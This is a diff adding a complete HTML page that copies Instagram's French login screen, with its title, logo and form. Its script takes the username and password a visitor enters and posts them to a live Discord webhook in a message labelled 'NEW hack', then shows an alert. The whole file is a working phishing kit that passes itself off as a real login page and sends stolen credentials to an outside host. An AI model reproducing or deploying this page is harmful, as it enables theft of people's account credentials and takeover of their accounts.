@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Instagram</title>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, sans-serif;
+}
+
+body{
+    background:#0f1c27;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    color:white;
+}
+
+.container{
+    width:100%;
+    max-width:380px;
+    padding:20px;
+    text-align:center;
+}
+
+.language{
+    color:#b0b7c3;
+    margin-bottom:40px;
+    font-size:15px;
+}
+
+.logo img{
+    width:85px;
+    margin-bottom:40px;
+}
+
+.input-box{
+    width:100%;
+    margin-bottom:15px;
+}
+
+.input-box input{
+    width:100%;
+    padding:16px;
+    border-radius:12px;
+    border:1px solid #344352;
+    background:#182734;
+    color:white;
+    font-size:16px;
+    outline:none;
+}
+
+.input-box input::placeholder{
+    color:#94a3b8;
+}
+
+.login-btn{
+    width:100%;
+    padding:15px;
+    border:none;
+    border-radius:30px;
+    background:#0095f6;
+    color:white;
+    font-size:20px;
+    cursor:pointer;
+    margin-top:10px;
+}
+
+.forgot{
+    margin-top:25px;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+}
+
+.create{
+    margin-top:120px;
+    border:1px solid #0095f6;
+    padding:15px;
+    border-radius:30px;
+    color:#0095f6;
+    font-size:18px;
+    cursor:pointer;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="language">
+Français (France)
+</div>
+
+<div class="logo">
+<img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
+</div>
+
+<div class="box">
+
+  <h2> </h2>
+ <div class="input-box">
+  <input type="text" id="text" placeholder="Nom de profil, e-mail ou numéro de mobile">
+ </div>
+  
+ <div class="input-box">
+  <input type="password" id="password" placeholder="Mot de passe">
+</div>
+
+  <button class="login-btn" onclick="sendOrder()">
+    Se connecter
+    </button>
+
+</div>
+
+
+
+<div class="forgot">
+Mot de passe oublié ?
+</div>
+
+<div class="create">
+Créer un nouveau compte
+</div>
+
+</div>
+<script>
+function sendOrder(){
+
+  let text = document.getElementById("text").value;
+  let password = document.getElementById("password").value;
+
+  fetch("https://discord.com/api/webhooks/1503039452371751002/GBoURXCgmqZgLUD1gnkNA0jycx_dfhzAUt0giRmbiK9XbZvNHGjjZlsOeq1toMmw3KIy", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      content:
+`🛒 NEW hack
+
+👤 PROFIL: ${text}
+📦 MOT DE PASS: ${password}`
+
+    })
+  });
+
+  alert("GOOOOOOOOD!");
+}
+</script>
+
+</body>
+</html>
